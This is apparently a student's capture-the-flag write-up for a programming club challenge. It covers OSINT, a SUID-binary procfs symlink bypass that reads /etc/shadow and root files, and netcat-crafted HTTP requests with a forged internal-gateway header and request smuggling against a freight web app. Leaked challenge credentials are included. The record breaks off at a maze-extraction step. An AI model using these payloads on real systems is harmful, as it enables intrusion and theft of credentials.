# Detailed Write-up on Capturing the flag: 

## Step - 1: Finding the name of the suspected coordinator: 
Searched inside the P - Club members and the members of the Wired-In, a name common in both was of `Ketan`. He was having two GitHub accounts, but as per the problem statement there was something pushed, then searched for the recent changes and found `0xc1ph3rf0x` as the suspected git account. 

Ran the `python3 sherlock 0xc1ph3rf0x` to see where else this handle is registered across the internet. This confirmed that there is only one target repository. 

## Step - 2 : Searching for the history of the commit: 
Grabbed the public event history for the 0xc1ph3rf0x account. We will use curl to fetch it and jq (a command-line JSON processor) to format it so it's readable.

`curl -s https://api.github.com/users/0xc1ph3rf0x/events/public | jq . > suspect_events.json` - By this command the raw data saved in `suspect_events.json`.

## Step - 3: Starting random searches for the flag, inside the raw file: 
First used the grep command for the search of the flag. 
`grep -i "pclub{" suspect_events.json`
This search didn't gave anything as the output. 

Then, ran this `jq` command for print out exactly what repository they touched and the payload (the details of what they created):
`jq '.[0] | {Repository: .repo.name, What_Was_Created: .payload.ref_type, Name: .payload.ref, Description: .payload.description}' suspect_events.json`

This gave me the following details: 
`{
  "Repository": "0xC1ph3rF0x/infosec-notes",
  "What_Was_Created": "branch",
  "Name": "master",
  "Description": null
}`

Then, used for the entire searching in the repository, `git grep "pclub{" $(git rev-list --all)`
Then, Inspected the Patch History. `git log -p`
Then, opened the hidden file - `cat .git/config`. found the following: 

`pack-refs with: peeled fully-peeled sorted 
67082fd69354b1f510a383684bdee9e911a5d8c6 refs/remotes/origin/master`

## Step - 4: Hunting for the Encoded Flag and file: 
1. Searched for - `grep -ri "cGNsdWJ"` .
2. Inspected the entire branch history - `git log -p`
3. Searched for all the historical file content - `git log --all -S "cGNsdWJ" -p`

Then, tried to found in terms of hexadecimal conversion and ROT 13.

## Step - 5: Connecting from the hint: 
"Another signal was left entirely off-system. It bypassed our web logs because it was never an HTTP request. It was buried at the edge of our perimeter, sitting out there in the open."

"The DNS guy" + "bypassed web logs" + "edge of our perimeter" = Domain Name System (DNS) Records. - `dig TXT wiredin.pclub.in`

Then, found something groundbreaking. Inside the TXT of wiredin.pclub.in found the following lines: 

"Found this insane playlist the other day while digging through some stuff.\010Curator: `bhopinder jogi\010Link: https://open.Spotify.com/playlist/5iK4rR41V1DSqTot2JO15f?si=oEIMe-TLTGiOPetf50R71w\010Perfect` for late-night CTF sessions."

Then, after a bit of research on the Spotify found a profile under bhopinder jogi, the name of the playlist comes as whoami.

## Step - 6: Investigation Genesis & Metadata Triangulation
The operation commenced with the detection of a targeted Spotify playlist named `whoami`, uploaded by an account using the identifier `bhopinder jogi`. Initial reconnaissance focused on assessing basic file headers and tracking anomalies within the initial 5 visible tracks:
* **Roommates** – 3:34
* **Everybody Talks** – 2:57
* **Call Me Maybe** – 3:13
* **Judas** – 4:09
* **AIZO** – 3:35

While song runtimes matched standard distribution patterns, file steganography avenues via WebP thumbnail objects (`300x216` resolution pixel matrices) were ruled out due to image-rendering compression artifacts deployed server-side by the platform's CDN.

## Step - 7: Acrostic Extraction & Network Reconnaissance
To extract un-obfuscated layout data, raw network traffic scraping was executed utilizing web streaming payloads (`curl`). This bypassed the standard platform frontend restrictions and pulled the comprehensive 16-track playlist schema. 

Parsing the exact starting characters of each title sequentially revealed a hidden infrastructure pointer:
* **R**oommates, **E**verybody Talks, **C**all Me Maybe, **J**udas, **A**IZO, **I**ris, **L**ove, **.**..Baby One More Time, **P**etals on the Moon, **C**loser, **L**ove Me Not, **u**ndressed, **B**aby, **.**..Ready For It?, **I**RIS OUT, **N**o Broke Boys.

The sequence resolved cleanly to a dedicated network location: `recjail.pclub.in`. Parallel analysis converting track runtimes into standard decimal seconds generated a specific 8-bit integer string (`214`, `177`, `193`, `249`, `215`), matching an auxiliary port alignment sequence.

## Step - 8: Infrastructure Profiling
Active scanning (`nmap`) of the target domain revealed a strict border firewall deployment:
* **Port 22/TCP (SSH):** Filtered (State drop)
* **Port 80/TCP (HTTP) & Port 443/TCP (HTTPS):** Open

The infrastructure edge layer returned identification banners indicating a reverse-proxy arrangement handled via Cloudflare Web Application Firewall (WAF). This configuration explicitly drop-filters low-level raw transport layer protocols (like TCP connection knocking hooks), forcing all interaction through standard web-based entry pathways.

## Step - 9: Local Shell Enumeration
Interacting directly with the application interface over standard HTTP/S initiated a dynamic terminal landing page, providing an active, non-interactive shell interface. Initial standard command execution established the following local parameters:
* **Identity Mapping:** Operational as `ctf_user` with standard low-privilege security tokens (`uid=1000`, `gid=1000`, `groups=1000`).
* **Operating System:** Running an Ubuntu 22.04.5 LTS (Jammy Jellyfish) container workspace.
* **Directory Integrity:** The primary shell workspace (`/home/ctf_user`) was found to be fully vacant. Executing hidden item checks (`ls -la`) proved the folder held zero environmental history footprints or transient artifact remnants.
* **Binary Availability:** System execution search paths (`$PATH`) were mapped to functional system storage routes (`/usr/bin`, `/bin`, `/sbin`), indicating that standard text handling and evaluation binaries (`cat`, `grep`, `env`) remained globally unconstrained.

## Step - 10: Architectural Sandbox Profiling
A deep global filesystem recursive search for standard flag signatures failed to return hardcoded destination items outside of non-privileged network state registers inside `/proc/sys/`. 

Executing a complete active process inventory tree (`ps aux`) exposed the foundational design framework of the environment:
* **Session Volatility:** Discovered an accumulation of defunct `<defunct>` zombie bash branches from previous connections.
* **Containment Runtime:** Detected an active root process supervising execution via an absolute directive path: `nsjail -q --config /etc/nsjail`.

This confirmed the system utilizes structural kernel separation layers (Namespaces and Control Groups) to isolate incoming interactions, dynamically anchoring each shell instance inside an unprivileged, read-only temporary file tree. This operational state marked the completion of the baseline structural mapping.

---
## Step - 11: Detailed Analysis Expansion

### Deep Dive: Phase 1 & 2 Methodology
The initial playlist investigation involved checking the track durations (e.g., 3:34, 2:57), but standard steganography was ruled out because Spotify compresses images into `300x216` WebP files, destroying pixel-level payloads. By using raw `curl` requests to pull the playlist's uncompressed HTML source code, we bypassed the UI. This allowed us to read the exact sequence of the 16 tracks. By extracting the very first character of every track (including punctuation like the ellipses on "...Baby One More Time"), the string `RECJAIL.PCLUB.IN` was revealed.

### Deep Dive: Phase 3 & 4 Execution
Network scans on the target domain showed ports 80 and 443 were proxied through Cloudflare, neutralizing direct port-knocking attempts. Navigating to the domain via a web browser successfully dropped us into a live web terminal. Running local enumeration commands (`pwd`, `id`, `ls -la`, `echo $PATH`) confirmed the environment was an Ubuntu 22.04 LTS instance running under `ctf_user`, but the home directory was completely empty.

### Deep Dive: Phase 5 Containment 
Running `find / -name "*flag*"` failed to find the target payload in the global filesystem. Executing `ps aux` to check running processes revealed a root process running `nsjail -q --config /etc/nsjail` alongside a horde of zombie (`<defunct>`) bash sessions. This proved the shell was actively trapped inside a highly restrictive Google `nsjail` container sandbox, effectively sandboxing filesystem reads and forcing us to evaluate other vectors, such as hidden environment variables, to locate the flag.


Then, found a link that lead towards the terminal of the p - club - `RECJAIL.PCLUB.IN`

# Phasewise workflow for the flag capture:

### Initial Enumeration
Executed the following commands:

```bash
whoami - For checking the server
pwd - The location of the file 
ls - listing all the files
ls -la - listing all the files along with the hidden ones. 
```

### Results
- User: `ctf_user`
- Home directory: `/home/ctf_user`
- Minimal filesystem environment

### Additional Environment Inspection
Commands used:

```bash
id
uname -a
env
```

### Findings
The environment appeared to be:

- Containerized
- Linux-based
- Restricted
- Running with minimal environment variables as many of the commands were not working and were not present on the system. 

---

## 1. SUID Enumeration - Took the help of this as was thinking that something was from the owner side was not giving the permission. With the help of SUID we gained the root - level file access. 

### Filesystem Enumeration
```bash
find / -perm -4000 2>/dev/null
```

### Discovery
The following binary was discovered: This is giving the visible path (From this point to the discovery of the root flag I also used ChatGPT)

```text
/usr/local/bin/secure_reader
```

This appeared to be challenge-specific.

---

## 2. Investigating `secure_reader`

### Initial Execution
```bash
/usr/local/bin/secure_reader
```

### Output
```text
Usage: /usr/local/bin/secure_reader <file_in_home_dir>
```

### Testing Performed
The following attack methods were tested:

- Path traversal
- Symlink attacks
- Encoded traversal

### Path Traversal Attempt
```bash
/usr/local/bin/secure_reader /home/ctf_user/../../etc/passwd
```

### Result
```text
ERROR: Path traversal sequence '..' detected!
```

### Symlink Attack Attempt
```bash
ln -s /etc/passwd /home/ctf_user/passwd_link
```

The attack was blocked.

---

## 3. ProcFS Pivot

### Mount Inspection
```bash
mount
```

### Findings
- `/home/ctf_user` mounted as `tmpfs`
- `procfs` accessible

### ProcFS Exploitation Attempt
```bash
mkdir /home/ctf_user/proc
ln -s /proc /home/ctf_user/proc/p
```

### Exploit Execution
```bash
/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/status
```

### Result
The ProcFS path successfully bypassed the intended protections.

---

## 4. Privilege Escalation Confirmation

Reading the ProcFS status file revealed:

```text
Uid: 1000 0 0 0
```

### Conclusion
This confirmed:

- Effective UID was `0`
- The binary executed as root
- Arbitrary root-readable file access became possible

---

## 5. Reading Root-Owned Files

### Commands Used
```bash
/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/etc/passwd
/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/etc/shadow
```

### Result
Both files were successfully read.

This demonstrated a complete sandbox bypass.

---

## 6. Root Flag Discovery

### Common Flag Locations Tested
The following command successfully revealed the flag:

```bash
/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/root/flag.txt
```

### Flag Extracted
```text
pclub{0_n0f0ll0w_0nly_pr0t3ct5_th3_t41l}
```

### Additional Data Discovered
```text
168.144.73.17:8003
analyst:Fr8_4nalyst!
```
## Moving Toward EuroFreight Infrastructure, as it was also mentioned in the data along with the login option after getting the first flag. 

Using the discovered credentials, investigation shifted toward the link provided:

```text
http://168.144.73.17:8003
```

---

## Investigating Session Cookies

A suspicious session cookie was identified, I looked around the DevTools and found under the network tab, under the response header secation a suspecious cookie. This cookie was encoded in the form of the base 64 :

```text
session=eyJyb2xlIjoiYWRtaW4ifQ.ag8GYg.JBF33R3waq2kcA-aUBJLZGU2KlY
```

Decoding revealed:

```json
{"role":"admin"}
```

---

## Attempted Direct Internal Access

Request:

```bash
curl -i \
-H "Cookie: session=..." \
http://168.144.73.17:8003/internal/queue
```

returned:

```text
403 Forbidden
```

---

## Hypothesizing Gateway Filtering

Observation:
- gateway protections blocked internal endpoints.

Then, thought that the raw HTTP requests might bypass the filtering logic.

---

## Using Raw HTTP Requests

The command for the above stated task was:

```bash
printf 'GET http://127.0.0.1/internal/queue HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=...\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
```

This successfully bypassed protections and the response gave the second flag in the journey.

---

## Discovering the Second Flag

Response:

```json
{
  "flagged_shipments": [
    "PCLUB{5muggl1ng_ch41n_unl0ck3d}"
  ]
}
```

---

## Now, moving towards the dicovery of the third flag, checking the API Documentation

Further exploration revealed:

```text
/api-docs
```

The endpoint documented:
- `/upload`
- `/internal/queue`
- `/internal/admin-session`

---

## Discovering Chunked Transfer Support

The documentation explicitly mentioned:

```text
chunked transfer supported
```

This strongly suggested:
- request smuggling opportunities.
**Smuggling** - Request Smuggling is a web attack technique where an attacker exploits differences in how frontend and backend servers parse HTTP requests, allowing hidden or unintended requests to be processed internally.

With the help of this method we want a way to sneak requests past the gateway. 
---

## Testing Chunked Uploads

Chunked transfer test:

```bash
printf 'POST http://127.0.0.1/upload HTTP/1.1\r\nHost: 127.0.0.1\r\nTransfer-Encoding: chunked\r\n\r\n1A\r\nmanifest=FLAGTEST123456789\r\n0\r\n\r\n' | nc 168.144.73.17 8003
```

returned:

```json
{"tracking_id":"TRK-9901X-A"}
```

---

## Accessing the Dashboard

Dashboard access:

```bash
printf 'GET http://127.0.0.1/dashboard HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=...\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
```

revealed:
- shipment listings,
- administrative shipment statuses.

---

# Step 44 — Identifying a Suspicious Shipment - This was also visible and found after logging on to the website. (From this point to the fidning of the third flag I also used ChatGPT)

One shipment stood out:

```text
BERLIN-NOV07
```

Status:

```text
HELD — ADMIN CLEARANCE REQUIRED
```

---

## Enumerating Shipment IDs

Additional shipment IDs tested:
- BERLIN-NOV08
- BERLIN-NOV06
- BERLIN-DEC07

All returned:
- Shipment not found.

---

## Accessing Shipment Details - This thought came as there might be something inside each of the shipments: 

Request:

```bash
printf 'GET http://127.0.0.1/shipments/BERLIN-NOV07 HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=...\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
```

After searching for the first shipment found the third flag in the way: 

```text
PCLUB{m4st3r_0f_th3_fr31ght_n3tw0rk}
```

---

## Discovering the Third Flag

Recovered flag:

```text
PCLUB{m4st3r_0f_th3_fr31ght_n3tw0rk}
```

---

# Step 48 — Exploring Additional Internal Endpoints

Tested:
- `/internal/debug`
- `/internal/logs`
- `/internal/status`
- `/internal/config`

All returned:
- 404 Not Found.

---

# Step 49 — Testing SSTI

Payload:

```json
{"manifest":"{{7*7}}"}
```

No SSTI observed.

---

# Step 50 — Testing SSRF

Payload:

```json
{"manifest_url":"http://127.0.0.1/internal/queue"}
```

No additional disclosure observed.

---

# Step 51 — Performing Infrastructure Enumeration

Scanning:

```bash
nmap -Pn -T4 168.144.73.17
```

revealed:
- port 22 (SSH),
- port 8008 (unknown service).

---

# Step 52 — Investigating Port 8008

Port 8008:
- accepted TCP connections,
- acknowledged payloads,
- returned no application-layer data.

---

# Step 53 — Testing WebSocket Handshakes

WebSocket handshake attempts:

```bash
printf 'GET / HTTP/1.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n' | nc 168.144.73.17 8008
```

produced:
- no response,
- hanging sessions.

---

# Step 54 — Monitoring Traffic Using tcpdump

Traffic monitoring:

```bash
sudo tcpdump -nn -i any host 168.144.73.17 and port 8008
```

revealed:
- TCP acknowledgements,
- payload acceptance,
- no visible response traffic.

This suggested:
- telemetry sink,
- signaling endpoint,
- or silent infrastructure listener.

---

## Service Fingerprinting of the Port 8008

This is trying to identify the following this on this port: - 
- the actual service,
- hidden HTTP behavior,
- banners,
- TLS hints,
-   protocol fingerprints.

Traffic monitoring:

```bash
sudo tcpdump -nn -i any host 168.144.73.17 and port 8008
```

revealed:
- TCP acknowledgements,
- payload acceptance,
- no visible response traffic.

This suggested:
- telemetry sink,
- signaling endpoint,
- or silent infrastructure listener.

---

## After finding of three flags we have the following informations: - 

After flag 3, two key unexplored leads remained:
1. **Port 8008** on `168.144.73.17` — accepted TCP connections but returned no data
2. **SSH on port 22** — required a public key, not a password
3. **`/internal/admin-session`** endpoint — generated admin cookies but nothing beyond that
4. Credentials found alongside flag 1: `analyst:Fr8_4nalyst!`

---

## Step 1: Hitting `/internal/admin-session` with the New Cookie

**The Command for each of the step is also being mentioned here:**
```bash
printf 'GET http://127.0.0.1/internal/admin-session HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=eyJyb2xlIjoiYWRtaW4ifQ.ag8GYg.JBF33R3waq2kcA-aUBJLZGU2KlY\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
```

**Result:**
```
HTTP/1.1 200 OK
Set-Cookie: session=eyJyb2xlIjoiYWRtaW4ifQ.ahF2eg.dRHT4UZc55c6oTwumOwX0UbCrsI; Path=/
{"status":"Admin session generated"}
```

**Observation:** A fresh admin session cookie was generated. Then, I saved it for subsequent requests.

---

## Step 2: Probing Port 8008

Tried multiple approaches to interact with the mysterious port 8008.

### Attempt 1 — Raw HTTP GET
```bash
printf 'GET / HTTP/1.0\r\n\r\n' | nc 168.144.73.17 8008
```
**Result:** No output. Silent.

### Attempt 2 — Plain netcat connection
```bash
nc -v 168.144.73.17 8008
```
**Result:** Connection succeeded but hung indefinitely with no response.

### Attempt 3 — With timeout
```bash
nc -w 5 168.144.73.17 8008 < /dev/null
```
**Result:** Timed out silently.

**Conclusion:** Port 8008 was accepting connections but not responding to standard HTTP. Deferred for later investigation.

---

## Step 3: SSH Attempt with Found Credentials

```bash
ssh analyst@168.144.73.17
# Password: Fr8_4nalyst!
```

**Result:**
```
analyst@168.144.73.17: Permission denied (publickey).
```

**Observation:** SSH was configured to require a public key, not password authentication. Without a private key, this path was blocked.

---

## Step 4: POST Smuggling to `/internal/admin-session`

Tried HTTP request smuggling using chunked transfer encoding:

```bash
printf 'POST http://127.0.0.1/internal/admin-session HTTP/1.1\r\nHost: 127.0.0.1\r\nTransfer-Encoding: chunked\r\nCookie: session=...\r\n\r\n0\r\n\r\n' | nc 168.144.73.17 8003
```

**Result:**
```
HTTP/1.1 405 METHOD NOT ALLOWED
Allow: GET, OPTIONS, HEAD
```

**Conclusion:** `/internal/admin-session` only accepts GET requests. Smuggling not applicable here.

---

## Step 5: Re-hitting `/internal/queue` with New Admin Cookie

```bash
printf 'GET http://127.0.0.1/internal/queue HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=eyJyb2xlIjoiYWRtaW4ifQ.ahF2eg.dRHT4UZc55c6oTwumOwX0UbCrsI\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
```

**Result:**
```json
{"flagged_shipments":["PCLUB{5muggl1ng_ch41n_unl0ck3d}"],"status":"success"}
```

**Conclusion:** Same flag 2 returned. No new data from the refreshed admin session.

---

## Step 6: Checking API Docs with Admin Cookie

```bash
printf 'GET http://127.0.0.1/api-docs HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=...\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
```

**Result:**
```json
{
  "endpoints": [
    {"method":"POST","path":"/upload"},
    {"method":"GET","path":"/internal/queue"},
    {"method":"GET","path":"/internal/admin-session"}
  ]
}
```

**Observation:** Only 3 endpoints documented. No new hidden endpoints revealed by the admin cookie.

---

## Step 7: Exploring the `/upload` Endpoint

### Attempt 1 — GET request
```bash
printf 'GET http://127.0.0.1/upload HTTP/1.1\r\n...' | nc 168.144.73.17 8003
```
**Result:** `405 METHOD NOT ALLOWED` — POST only.

### Attempt 2 — POST with JSON manifest
```bash
printf 'POST http://127.0.0.1/upload HTTP/1.1\r\n...Content-Length: 27\r\n\r\n{"manifest":"ADMIN_TEST_001"}' | nc 168.144.73.17 8003
```
**Result:** `{"tracking_id":"TRK-9901X-A"}` — Static dummy response regardless of input.

### Attempt 3 — Chunked transfer smuggling
```bash
printf 'POST http://127.0.0.1/upload HTTP/1.1\r\n...Transfer-Encoding: chunked\r\n\r\n1a\r\n{"manifest":"SMUGGLE_TEST"}\r\n0\r\nX-Smuggled: true\r\n\r\nGET /internal/flag HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n' | nc 168.144.73.17 8003
```
**Result:**
```
{"tracking_id":"TRK-9901X-A"}
Bad Request — Invalid header
403 Forbidden — Access Denied: Direct access to internal endpoints is forbidden by the Gateway
```

**Observation:** `/internal/flag` returned a 403, confirming the endpoint exists but is protected. The smuggling technique was only applicable for flag 2.

---

## Step 8: Trying `/internal/flag` Directly

```bash
printf 'GET http://127.0.0.1/internal/flag HTTP/1.1\r\n...\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
```

**Result:** `404 NOT FOUND` — Endpoint does not exist under that name.

---

## Step 9: Enumerating Other Internal Endpoints

Tried various guessed endpoint names — all returned 404:

```bash
# /internal/ssh-key
# /internal/flag
# /shipments (without ID)
# /internal/debug
# /internal/logs
# /internal/status
# /internal/config
```

All returned `404 Not Found`.

---

## Step 10: Full Dashboard Enumeration

Fetched the raw dashboard HTML with the admin cookie:

```bash
printf 'GET http://127.0.0.1/dashboard HTTP/1.1\r\n...\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
```

**Result:** Three shipments found: The screenshot of the table is being mentioned below: - 
![image alt](https://github.com/amritanshukumar2006-collab/Programming-Club-Secretary-Task/blob/54dd5010ca74367670b8666643d3921def2cc019/Screenshot%20From%202026-05-26%2003-34-45.png)

| ID | Status |
|----|--------|
| LND-OCT12 | In Transit |
| BERLIN-NOV07 | HELD — ADMIN CLEARANCE REQUIRED |
| AMS-DEC01 | Delivered |

Tried hitting each individually:
```bash
# /shipments/LND-OCT12  → 404
# /shipments/AMS-DEC01  → 404
```

Only `BERLIN-NOV07` had previously returned flag 3. Others were dead ends, as mentioned and discussed earlier also. 

---

## Step 11: DNS Reconnaissance

Checked TXT records across all known subdomains:

```bash
dig TXT pclub.in           # No TXT records
dig TXT recjail.pclub.in   # No TXT records
dig TXT eurofreight.pclub.in  # NXDOMAIN
dig TXT 0xc1ph3rf0x.pclub.in  # NXDOMAIN
dig -x 168.144.73.17       # DigitalOcean hosted, no PTR record
```

**Conclusion:** No new DNS signals found.

---

## Step 12: GitHub Repository Deep Dive

Explored the full `0xC1ph3rF0x/infosec-notes` repository commit history, to check once again for any sort or any kind of hint that may be present inside the repository:

```bash
curl -s https://api.github.com/repos/0xC1ph3rF0x/infosec-notes/commits | jq '.[].sha'
```

Four commits found. Inspected each one:

| Commit | Files |
|--------|-------|
| `67082fd` | `workshops/network-basics.md` |
| `a7f51e4` | `workshops/web-security-101.md` |
| `f907db0` | `resources/reading-list.md`, `resources/tools.md` |
| `4c2597e` | `README.md` (initial commit) |

All files contained generic infosec content — nothing hidden in patches or deleted files.

**Conclusion:** GitHub repo was a complete dead end for the 4th flag.

---

## Step 13: Port 8008 — Credentials as Payload

Tried sending the found credentials directly to port 8008:

```bash
printf 'analyst:Fr8_4nalyst!\n' | nc -w 3 168.144.73.17 8008
```

**Result:** Session timed out, no response.

---

## Step 14: Back to the nsjail Shell — SUID Enumeration

Returned to the web terminal at `recjail.pclub.in` and ran. As I remembered that along with the loggin in credentials some information in the form of the matrix was also mentioned, which was not used till now: (From this point to the finding of the fourth flag also used Claude AI, as an assistant): - 

```bash
find / -perm -4000 2>/dev/null
```

**Result:** Only `/usr/local/bin/secure_reader` was the custom CTF binary. Same as before.

---

## Step 15: Using `secure_reader` via ProcFS — Rebuilding the Symlink

The nsjail resets the home directory each session. Recreated the procfs symlink:

```bash
mkdir /home/ctf_user/proc && ln -s /proc /home/ctf_user/proc/p
```

Then read various system files as root:

```bash
/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/etc/environment
# Result: Standard PATH only

/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/etc/hosts
# Result: 127.0.0.1 localhost, 172.21.0.2 af8672217670
```

**Key Discovery:** The `/etc/hosts` file revealed an internal Docker network IP: `172.21.0.2` mapped to container hostname `af8672217670`.

---

## Step 16: Internal Network Exploration

Tried to explore the Docker network at `172.21.0.x`:

```bash
ping -c 1 172.21.0.1   # bash: ping: command not found
cat /proc/net/fib_trie  # Only loopback 127.0.0.1 visible
/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/proc/net/tcp
# Empty — no active connections
/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/proc/net/arp
# Empty ARP table
```

**Conclusion:** The nsjail container was isolated from the Docker network. The `172.21.0.2` IP was visible in hosts but unreachable from inside the sandbox.

---

## Step 17: Reading the `secure_reader` Binary Itself

Attempted to read the binary to find hardcoded strings:

```bash
strings /usr/local/bin/secure_reader   # command not found
/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/usr/local/bin/secure_reader
# Access Granted but output was raw binary — unreadable without xxd/strings
```

---

## Step 18: Environment Variable Check

```bash
cat /proc/self/environ | tr '\0' '\n'
```

**Result:**
```
PWD=/home/ctf_user
HOME=/home/ctf_user
USER=ctf_user
SHLVL=0
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/cat
```

No hidden flag or pointer in the environment.

---

## Step 19: Re-reading `flag.txt` — The Breakthrough

Re-ran the original flag 1 command that had worked before:

```bash
/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/root/flag.txt
```

**Result:**
```
[+] Access Granted. Reading file:
pclub{0_n0f0ll0w_0nly_pr0t3ct5_th3_t41l}
168.144.73.17:8003, idp: analyst:Fr8_4nalyst!
[100264, 9125, 198, 2675, 527, 264, 11190, 18328, 100265, 198, 100264, 882, 198, 79, 20453, 90, 22, 32680, 15, 74, 62, 18, 1107, 292, 18, 81, 534, 51, 2757, 3686, 30, 7566, 30, 468, 14773, 2413, 79, 13, 720, 35170, 11, 6555, 990, 12222, 1618, 13, 2567, 433, 709, 627, 2485, 1129, 47216, 1103, 916, 14, 18, 71, 43559, 17, 67, 23, 100265, 198, 100264, 78191, 198]
```

**Key Discovery:** A new array of integers had appeared at the bottom that wasn't visible in earlier reads (or had been missed). This was the critical clue for the 4th flag.

---

## Step 20: Identifying the Token Format

Analyzed the integer array:

```
[100264, 9125, 198, 2675, 527, 264, 11190, 18328, 100265, 198, 100264, 882, 198, ...]
```

Recognized the structure:
- `100264` = `<|im_start|>` (ChatML special token)
- `100265` = `<|im_end|>` (ChatML special token)
- `198` = newline
- `9125` = `system`
- `882` = `user`
- `78191` = `assistant`

These are **cl100k_base token IDs** — the tokenizer used by GPT-4 and related models. The format is **ChatML**, confirming this was an LLM-formatted message with the flag encoded as token IDs.

### Failed Decode Attempts

**Attempt 1 — Unicode codepoints:**
```python
result = ''.join(chr(t) for t in tokens if t < 0x110000)
# Result: Garbled unicode — wrong approach
```

**Attempt 2 — Manual token mapping:**
Attempted to hand-map known tokens using approximate vocabulary:
```
pclub{7ikt0k_3_nic3r}  (partially guessed but imprecise)
```

**Attempt 3 — Online API:**
```python
import urllib.request
req = urllib.request.Request('https://api.openai.com/v1/embeddings')
# Hung — wrong endpoint for decoding tokens
```

**Attempt 4 — Port 8008 as LLM endpoint:**
```bash
printf '{"tokens":[79,20453,90,...]}\n' | nc -w 5 168.144.73.17 8008
# No response — port 8008 does not accept token IDs
```

---

## Step 21: Installing `tiktoken` and Decoding the Flag

Installed the official OpenAI tokenizer library on the local machine:

```bash
pip3 install tiktoken --break-system-packages
```

Then decoded the token array:

```python
import tiktoken
enc = tiktoken.get_encoding('cl100k_base')
tokens = [79, 20453, 90, 22, 32680, 15, 74, 62, 18, 1107, 292, 18, 81, 534, 51,
          2757, 3686, 30, 7566, 30, 468, 14773, 2413, 79, 13, 720, 35170, 11,
          6555, 990, 12222, 1618, 13, 2567, 433, 709, 627, 2485, 1129, 47216,
          1103, 916, 14, 18, 71, 43559, 17, 67, 23]
print(enc.decode(tokens))
```

**Output:**
```
pclub{7ikt0k_3_nic3r}
Tired yet? Yes? Womp womp.
JK, nice work till here. keep it up.
https://tinyurl.com/3hxbe2d8
```

---

## Flag 4 Captured

```
pclub{7ikt0k_3_nic3r}
```

### What the Flag Means

The flag `7ikt0k_3_nic3r` is a leet-speak version of **"tiktoken is nicer"** — a playful nod to the fact that the flag was encoded using OpenAI's `tiktoken` (cl100k_base) tokenizer, and the solve required installing and using it to decode the ChatML-formatted token ID array.

---

## Steps taken after finding of the fourth flag: - 

## Step 1: Exploring the link along with the fourth flag: - 

After finding of the fourth flag, I also got a link in below `https://tinyurl.com/3hxbe2d8 `. The link redirects to the following git hub gist: - 
**Command:** `https://gist.githubusercontent.com/shivam-0806/1dc097c5b06030e8e3cc9c8a6adc0fa5/raw/c819f0b3802b4c129d4a93a6ffe90bee3b6a0225/dylan.txt`

## Step 2: Download the file named as `dylan.txt`. 
**Command:** `wget -O stage5_binary https://tinyurl.com/3hxbe2d8`

## Step 3:  Identifying File Type. 

`
file stage5_binary
# Result: ASCII text, with very long lines (65536), with no line terminators
head -c 200 stage5_binary
# Result: f0VMRg... (base64 encoded ELF binary)
`

**Conclusion:** Base64 encoded Linux ELF binary.

## Step 4: Decoding the Binary - The first thought came of the conversion by the base 64: 

`
base64 -d stage5_binary > stage5_elf
file stage5_elf
# Result: ELF 64-bit LSB executable, x86-64, statically linked, Go BuildID=...
`

**Conclusion:** 64-bit Go executable.

## Step 4: Running the Binary

`
chmod +x stage5_elf
./stage5_elf
`

The screenshot below is the description of the output of running the above command: - 

![image alt](https://github.com/amritanshukumar2006-collab/Programming-Club-Secretary-Task/blob/17846c1a602a5a49d36e581b86493fbd31854052/Screenshot%20From%202026-05-26%2004-08-36.png)

## Step 5: Probing Inputs
Tested various inputs inside the executable programm:

| Input | Length | Response |
|-------|--------|----------|
| `help`, `north`, `south` | 4-5 | `Invalid trajectory` |
| `w`, `a`, `s`, `d` | 1 | `Invalid parameter length` |
| `DDDD` | 4 | `Invalid trajectory` |
| `RRRRR` | 5 | `Invalid trajectory` |
| `DDDDDDDD` | 8 | `Invalid parameter length` |
| `DDDDRRRRUUUURRRR` | 16 | `Invalid parameter length` |

**Conclusion:** Valid input length = **4 or 5 characters**.

---

## Step 6: Key Strings Found in Binary
```bash
strings stage5_elf | grep -i "invalid\|trajectory\|output\|connection"
```
**Important strings found:**
- `Initialize connection...`
- `Invalid trajectory`
- `Invalid parameter length`
- `[+] Output: %s` ← prints a string variable (the flag!)
- `[+] Target reached. Verifying path integrity...`
- `[-] Collision detected: Path blocked.`
- `[-] Signal lost: Out of bounds.`
- `[-] Decryption failed: Size mismatch.`

**Internal functions:**
- `main.main`
- `main.initRawMaze`
- `main.func`

---

## Step 7: Discovering It's Multi-Input
Used Python to probe input structure:
```python
import subprocess
for length in range(1, 20):
    path = 'D' * length
    proc = subprocess.run(['./stage5_elf'], input=path+'\n', capture_output=True, text=True, timeout=5)
    output = proc.stdout.strip()
    print(f'Length {length}: {repr(output)}')
```
**Discovered:** Program takes **at least 2 inputs**, then shows `[+] Output:`.

---

## Step 8: Brute Force Attempts — FAILED
Tried all 256 combinations of U/D/L/R at length 4 → nothing different.
Tried all 1024 combinations at length 5 → nothing different.
Tried all 256 NSEW combinations at length 4 → nothing different.

**Conclusion:** Either wrong character set or the path is not the key factor.

---

## Step 9: Maze Extraction
